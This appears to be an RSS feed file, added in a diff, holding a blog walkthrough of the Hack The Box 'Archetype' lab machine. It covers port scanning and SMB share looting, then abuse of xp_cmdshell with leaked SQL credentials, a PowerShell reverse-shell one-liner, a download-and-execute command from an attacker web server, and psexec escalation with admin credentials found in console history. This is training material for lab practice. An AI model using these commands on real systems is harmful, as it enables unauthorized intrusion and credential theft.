@@ -1,0 +1,200 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[h4rithd.com]]></title><description><![CDATA[Penetration Tester | Ethical Hacker | Security Researcher]]></description><link>http://192.168.8.3:2368/</link><image><url>http://192.168.8.3:2368/favicon.png</url><title>h4rithd.com</title><link>http://192.168.8.3:2368/</link></image><generator>Ghost 4.6</generator><lastBuildDate>Wed, 26 May 2021 19:36:03 GMT</lastBuildDate><atom:link href="http://192.168.8.3:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Archetype Walkthrough]]></title><description><![CDATA[Here I will begin with the path of "Starting Point". Basically it’s a series of 9 machines rated easy that should be rooted in a sequence.]]></description><link>http://192.168.8.3:2368/starting-point-htb-archetype-walkthrough/</link><guid isPermaLink="false">60ae92e354f7b1d506ddb87f</guid><category><![CDATA[StartingPoint]]></category><category><![CDATA[HackTheBox]]></category><category><![CDATA[Archetype Walkthrough]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[HarithDilshan]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Fri, 14 May 2021 18:47:00 GMT</pubDate><media:content url="http://192.168.8.3:2368/content/images/2021/05/banner-3.jpg" medium="image"/><content:encoded><![CDATA[<img src="http://192.168.8.3:2368/content/images/2021/05/banner-3.jpg" alt="Archetype Walkthrough"><p>Here I will begin with the path of &quot;Starting Point&quot;. Basically it&#x2019;s a series of 9 machines rated easy that should be rooted in a sequence.</p><hr><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-2.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="999" height="759" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-2.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-2.png 999w" sizes="(min-width: 720px) 720px"></figure><p>They will provide official walkthroughs for each 9 machines. As I think it will be very helpful for noob to understand the platform, techniques and more about HTB. And when it comes to noob, no one is here to find just zero-day vulnerabilities. So from my perspective, it&apos;s fine to read each and every walkthroughs provided by HTB and others to understand by yourself. <em>&quot;Walkthroughs are the teachers&quot;.</em></p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-3.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1202" height="328" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-3.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-3.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-3.png 1202w" sizes="(min-width: 720px) 720px"></figure><p>Enough talks &#x1F971;, let&apos;s start to hack. &#x1F431;&#x200D;&#x1F4BB;</p><blockquote>Disclaimers: No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedures to grab the flags! &#x1F431;&#x200D;&#x1F464;</blockquote><hr><h1 id="00-start-machine-%E2%80%A6">00. Start Machine &#x2026;</h1><p>To start machine, Just click &quot;Join Machine&quot;.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-4.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1633" height="751" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-4.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-4.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-4.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-4.png 1633w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine. usually it is<strong> 10.10.10.27 &#x1F920;</strong></p><p>Before going to enumeration steps we can simply ping to the IP address and check our VPN connection and whether machine is alive. Sometimes machines might &quot;Disable&quot; ping requests from passing through the firewall. But in most case ping will be a success!</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype
+&#x26A1;&#x276F; ping 10.10.10.27 -c 2
+PING 10.10.10.27 (10.10.10.27) 56(84) bytes of data.
+64 bytes from 10.10.10.27: icmp_seq=1 ttl=127 time=252 ms
+64 bytes from 10.10.10.27: icmp_seq=2 ttl=127 time=251 ms
+
+--- 10.10.10.27 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 250.934/251.550/252.167/0.616 ms
+--------------------------------------------------------------------</code></pre><hr><h1 id="01-enumeration-first-%E2%80%A6">01. Enumeration First &#x2026;</h1><h3 id="011-fast-ports-scan">01.1 Fast ports scan</h3><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27</code></pre><pre><code class="language-bash">-n	: Never do DNS resolution
+-vv	: Extra verbosity
+--open	: Output only open ports
+-p-	: Full TCP ports range (65535)
+-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable netwok</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2 
+&#x26A1;&#x276F; nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 19:15 +0530
+Initiating Ping Scan at 19:15
+Scanning 10.10.10.27 [4 ports]
+Completed Ping Scan at 19:15, 0.27s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 19:15
+Scanning 10.10.10.27 [65535 ports]
+Completed SYN Stealth Scan at 19:17, 172.44s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.27
+Host is up, received echo-reply ttl 127 (0.67s latency).
+Scanned at 2021-04-15 19:15:06 +0530 for 173s
+Not shown: 65523 closed ports
+Reason: 65523 resets
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+1433/tcp  open  ms-sql-s     syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 172.86 seconds
+           Raw packets sent: 102404 (4.506MB) | Rcvd: 93270 (3.731MB)
+--------------------------------------------------------------------</code></pre><p>I have some tricky bash script to get all open ports as bash variable call &quot;ports&quot;. Somehow it will be helpful later. &#x1F60E;</p><pre><code class="language-bash">ports=$(cat AllPorts.nmap | grep ^\[0-9\] | cut -d &apos;/&apos; -f 1 | tr &apos;\\n&apos; &apos;,&apos; | sed s/,$//)
+</code></pre><p>Yes, we can simply combine those two lines into one. But I need to see results quickly. That&apos;s why I divide it into two parts. If you want it in one line, you can use &#x1F447;&#x1F447;</p><pre><code class="language-bash">ports=$(nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27 | grep ^[0-9] | cut -d &apos;/&apos; -f 1 | tr &apos;\n&apos; &apos;,&apos; | sed s/,$//)&quot; 
+</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-sql">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2  took 2m52s
+&#x26A1;&#x276F; more AllPorts.nmap
+# Nmap 7.91 scan initiated Thu Apr 15 19:15:06 2021 as: nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27
+Nmap scan report for 10.10.10.27
+Host is up, received echo-reply ttl 127 (0.67s latency).
+Scanned at 2021-04-15 19:15:06 +0530 for 173s
+Not shown: 65523 closed ports
+Reason: 65523 resets
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack ttl 127 * (Interesting)
+139/tcp   open  netbios-ssn  syn-ack ttl 127 * (Interesting)
+445/tcp   open  microsoft-ds syn-ack ttl 127 * (Interesting)
+1433/tcp  open  ms-sql-s     syn-ack ttl 127 * (Interesting)
+5985/tcp  open  wsman        syn-ack ttl 127 * (Interesting)
+47001/tcp open  winrm        syn-ack ttl 127 * (Interesting)
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127</code></pre><p>Here we can see some &#xA0;<strong>* (Interesting)</strong> ports. others can be avoid.</p><h3 id="012-run-nmap-scripting-engine">01.2 Run Nmap Scripting Engine</h3><p>To get the best result we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all open ports so that we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p$ports 10.10.10.27 </code></pre><pre><code class="language-bash">-sV	: Service fingerprinting
+-sC	: Launch default NSE nmap scripts</code></pre><p>Most of the case this will be end up an error because of $ports variable. This is not the right time to fix it so if you get any error, run the command without $ports variable and point out all ports.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 135,139,455,1433 10.10.10.27 </code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
+&#x26A1;&#x276F; nmap -sV -sC -oN DetailPorts.nmap -p 135,139,455,1433 10.10.10.27
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 19:38 +0530
+Nmap scan report for 10.10.10.27
+Host is up (0.52s latency).
+
+PORT     STATE  SERVICE        VERSION
+135/tcp  open   msrpc          Microsoft Windows RPC
+139/tcp  open   netbios-ssn    Microsoft Windows netbios-ssn
+455/tcp  closed creativepartnr
+1433/tcp open   ms-sql-s       Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info:
+|   Target_Name: ARCHETYPE
+|   NetBIOS_Domain_Name: ARCHETYPE
+|   NetBIOS_Computer_Name: ARCHETYPE
+|   DNS_Domain_Name: Archetype
+|   DNS_Computer_Name: Archetype
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2021-04-15T14:30:06
+|_Not valid after:  2051-04-15T14:30:06
+|_ssl-date: 2021-04-15T14:30:34+00:00; +21m39s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 21m39s, deviation: 0s, median: 21m38s
+| ms-sql-info:
+|   10.10.10.27:1433:
+|     Version:
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_smb2-security-mode: SMB: Couldn&apos;t find a NetBIOS name that works for the server. Sorry!
+|_smb2-time: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.24 seconds</code></pre><p>Now we know the OS is Windows (Microsoft SQL Server 2017 RTM) and it has SMB (1433) port open. And lets enumerate further. Remember enumerating is the key! &#x1F511;</p><h3 id="013-list-all-available-shares">01.3 List all available shares</h3><p>So here it has smb (1433) port open. I used smbclient to list out all the available shares as anonymous user.</p><pre><code class="language-bash">sudo smbclient -N -L 10.10.10.27</code></pre><pre><code class="language-bash">-N	: Don&apos;t ask for a password
+-L	: Get a list of shares available on a host</code></pre><p>Here is output &#x1F447;</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
+&#x26A1;&#x276F; sudo smbclient -N -L 10.10.10.27
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backups         Disk
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available</code></pre><p>Here we got something very interesting right? There is only single share &#x2018;<strong>backups</strong>&#x2019; accessible with no passwords. so let&apos;s try to access it and see what&apos;s inside.&#x1F60E;&#x1F60B;</p><pre><code class="language-bash">smbclient -N \\\\10.10.10.27\\backups\\</code></pre><p>So now we are done with SMB shell and there is a file called &#x2018;prod.dtsConfig&apos;. so let&apos;s download it.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
+&#x26A1;&#x276F; smbclient -N \\\\10.10.10.27\\backups\\
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Mon Jan 20 17:50:57 2020
+  ..                                  D        0  Mon Jan 20 17:50:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 17:53:02 2020
+
+                10328063 blocks of size 4096. 8203982 blocks available
+smb: \&gt; get prod.dtsConfig
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+smb: \&gt;</code></pre><pre><code class="language-bash">smb: \&gt; dir	: List all directories
+smb: \&gt; get	&lt;file-name&gt; : Download file</code></pre><p>Now we can open prod.dtsConfig file and yeah that &#x2018;prod.dtsConfig&#x2019; file contains a SQL connection string, containing credentials for the local Windows user <strong>ARCHETYPE\sql_svc</strong> &#x1F942;.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2  took 5m55s
+&#x26A1;&#x276F; more prod.dtsConfig
+&lt;DTSConfiguration&gt;
+    &lt;DTSConfigurationHeading&gt;
+        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;
+    &lt;/DTSConfigurationHeading&gt;
+    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;
+        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
+    &lt;/Configuration&gt;
+&lt;/DTSConfiguration&gt;</code></pre><hr><h1 id="02-lets-get-foothold-%E2%80%A6">02. Lets get Foothold &#x2026;</h1><p>Now we have credentials, &#xA0;Let&apos;s try connecting to the SQL Server using <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py" rel="noopener noreferrer">Impacket&apos;s </a>mssqlclient.py</p><blockquote>Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.source : <a href="https://github.com/SecureAuthCorp/impacket" rel="noopener noreferrer">https://github.com/SecureAuthCorp/impacket</a></blockquote><h3 id="021-download-and-use-mssqlclientpy">02.1 Download and use mssqlclient.py</h3><p>First we need to simply wget and download the mssqlclient.py script.</p><pre><code class="language-bash"> wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
+</code></pre><p>And then run the script and check whether we are working as a sysadmin (privileged user) or not.</p><pre><code class="language-bash">python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth</code></pre><p>Now we can use the <a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15" rel="noopener noreferrer"><strong>IS_SRVROLEMEMBER </strong></a>function to check whether the current SQL user has sysadmin (highest level) privileges on the SQL Server.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
+&#x26A1;&#x276F; python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to &apos;master&apos;.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL&gt; SELECT IS_SRVROLEMEMBER (&apos;sysadmin&apos;)
+
+
+-----------
+
+          1
+
+SQL&gt;</code></pre><p>According to the return value (1 = login is a member of role.) yes we have highest privileges.&#x1F601; This will allow us to enable <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" rel="noopener noreferrer"><code>xp_cmdshell</code></a> and gain RCE on the host.</p><p>Check below awesome blog posts to understand that trick.</p><ul><li>Pentesting MSSQL - Microsoft SQL Server <a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server" rel="noopener noreferrer">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></li><li>MySQL Information Gathering <a href="https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql" rel="noopener noreferrer">https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql</a></li></ul><h3 id="022-usage-of-xpcmdshell">02.2 Usage of &#xA0;xp_cmdshell</h3><p>To get <code>xp_cmdshell</code>, type below commands.</p><pre><code class="language-sql">EXEC sp_configure &apos;Show Advanced Options&apos;, 1; 
+reconfigure; 
+sp_configure; 
+EXEC sp_configure &apos;xp_cmdshell&apos;, 1 
+reconfigure; 
+xp_cmdshell &quot;whoami&quot;</code></pre><pre><code class="language-sql">SQL&gt; xp_cmdshell &quot;whoami&quot;
+output
+
+--------------------------------------------------------------------------------
+
+archetype\sql_svc
+
+NULL</code></pre><p>However, Now we can run system commands using `xp_cmdshell`. why can&apos;t we get proper shell. &#x1F920;</p><p>Hmmmmah !! what a nice smell for powershell reverse-shell huh! &#x1F60D;</p><p>You can get some idea about reverse shells from below links,</p><ul><li>Reverse Shell Generator <a href="https://www.revshells.com/" rel="noopener noreferrer">https://www.revshells.com</a>&#x200B;</li><li>Nishang framework <a href="https://github.com/samratashok/nishang" rel="noopener noreferrer">https://github.com/samratashok/nishang</a>&#x200B;</li><li>TCP port communications with PowerShell <a href="https://livebook.manning.com/book/powershell-deep-dives/chapter-4/" rel="noopener noreferrer">https://livebook.manning.com/book/powershell-deep-dives/chapter-4</a>&#x200B;</li></ul><p>But personally, I like to use Nishang&apos;s <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1" rel="noopener noreferrer">Invoke-PowerShellTcpOneLine.ps1</a> to create my rev-shell.</p><p>After deleting all comments and unwanted things, powershell script will be like this. &#x1F447;</p><pre><code class="language-bash">$client = New-Object System.Net.Sockets.TCPClient(&apos;YourIP&apos;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+$sm=(New-Object Net.Sockets.TCPClient(&apos;YourIP&apos;,4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)}</code></pre><blockquote>Remember: Type <strong><strong><code>ifconfig tun0</code> </strong></strong>and replace<strong><strong> YourIP</strong></strong></blockquote><h3 id="023-get-reverse-shell"><strong>02.3 Get Reverse Shell</strong></h3><p>Now time to get reverse shell. Save above powershell script as anyname.ps1 (here I use script.ps1) and power up mini webserver. I&apos;m a very lasy man you know &#x1F644; so here I use <a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer"><code>updog</code> </a>instead of typing long shit in python &#x1F611;</p><blockquote>Updog is a replacement for Python&apos;s <code>SimpleHTTPServer</code>. It allows uploading and downloading via HTTP/S, can set ad hoc SSL certificates and use HTTP basic auth.source : <a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer">https://github.com/sc0tfree/updog</a>&#x200B;root in</blockquote><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
+&#x26A1;&#x276F; updog
+[+] Serving /root/Documents/HackThebox/Archetype...
+ * Running on http://0.0.0.0:9090/ (Press CTRL+C to quit)</code></pre><p>To listen the connection, I always use the swiss army knife (`<strong><strong>netcat</strong>`<strong>) </strong></strong>tool. personally I do not like to get shell through multi handler (`metasploit`). Trust me, using netcat tool you can learn a lot of things beyond metaspolit. &#x1F47D;</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
+&#x26A1;&#x276F; nc -lvnp 4444
+ listening on [any] 4444 ... </code></pre><hr><h1 id="03-exploit-the-target-%E2%80%A6"><strong>03. Exploit the target &#x2026;</strong></h1><p>Now we can issue the command to download and execute the reverse shell through <code>xp_cmdshell</code>.</p><pre><code class="language-bash">EXEC xp_cmdshell &apos;echo IEX (New-Object Net.WebClient).DownloadString(&quot;http://10.10.16.39:9090/script.ps1&quot;) | powershell -noprofile&apos;
+</code></pre><p>I divided up my terminal up to 3 parts using &#xA0;<a href="https://github.com/tmux/tmux/wiki" rel="noopener noreferrer">Tmux</a> multiplexer.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLHaXzk27LyhbgDjUf%2Fimage.png?alt=media&amp;token=0fa21382-731a-4469-911e-4a8d5ec43a1e" class="kg-image" alt="Archetype Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="outline: none; box-sizing: inherit; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; line-height: 1.625; max-width: 100%;">RevShell</span></figcaption></figure><p>Woooh!!! We got our shell. &#x1F480; A shell is received as <strong><strong><code>sql_svc</code></strong></strong>, and we can get the user.txt flag. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLIl1OHkcfDhlSqmNy%2Fimage.png?alt=media&amp;token=4160f34e-df3f-48ca-bc15-0e59feca779b" class="kg-image" alt="Archetype Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="outline: none; box-sizing: inherit; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; line-height: 1.625; max-width: 100%;">user.txt</span></figcaption></figure><hr><h1 id="04-privilege-escalation-%E2%80%A6"><strong>04. Privilege Escalation &#x2026;</strong></h1><p>To escalate privileges we can run different tools. By the way, before run any tool there are some steps that you need to run to enumerate some information. I will be showing you one by one in each walkthroughs.</p><p>Did you remember? now we are in service account called <strong><strong><code>sql_svc</code>. </strong></strong>It&apos;s good practice to check recently accessed files/executed commands (<em>Keep in mind as good practice</em>). &#xA0;Mostly (default) our console history will be saved in <code>C:\Users\&lt;account_name&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code> . Now you understand what our next step is.</p><p>Right, Let&apos;s check above file using type command. type</p><pre><code class="language-bash">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">PS C:\Users\Administrator&gt; type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+PS C:\Users\Administrator&gt;</code></pre><p>Oh no no no noooo.. You see?</p><p>The backup share is mapped with admin credentials. Remember if you saw something like this. ready to launch Impacket&apos;s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py" rel="noopener noreferrer"><code>psexec.py</code></a> script.</p><pre><code class="language-bash">python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
+</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
+&#x26A1;&#x276F; python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.27.....
+[*] Found writable share ADMIN$
+[*] Uploading file gZiCFMKg.exe
+[*] Opening SVCManager on 10.10.10.27.....
+[*] Creating service FuWR on 10.10.10.27.....
+[*] Starting service FuWR.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+
+C:\Windows\system32&gt;</code></pre><p>Finally we have Administrator Privileges. &#x1F44C; Now we can access the flag on the administrator desktop.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLP7ji_aKDAJVwtM3-%2Fimage.png?alt=media&amp;token=34f7112a-ba5b-4bd0-a2ae-c1d030b68a25" class="kg-image" alt="Archetype Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="outline: none; box-sizing: inherit; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; line-height: 1.625; max-width: 100%;">root.txt</span></figcaption></figure><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-M_zEsWTNjRcuOaViQsC%2F-M_zFfzCHXa8Hugk-ADS%2Fimage.png?alt=media&amp;token=93d84b32-2d92-43ab-adf3-f9e1270cb647" class="kg-image" alt="Archetype Walkthrough" loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-5.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="292" height="172"></figure><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item></channel></rss>
